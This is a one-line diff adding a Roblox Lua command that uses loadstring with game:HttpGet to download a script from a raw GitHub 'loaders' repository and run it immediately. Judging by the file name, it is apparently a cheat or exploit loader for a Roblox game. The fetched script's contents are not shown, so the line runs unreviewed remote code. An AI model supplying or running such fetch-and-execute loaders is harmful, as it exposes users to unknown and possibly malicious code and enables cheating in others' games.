@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/upd-paint-to-get-rich-spam7-fnayu0qshijsdh.lua"))()
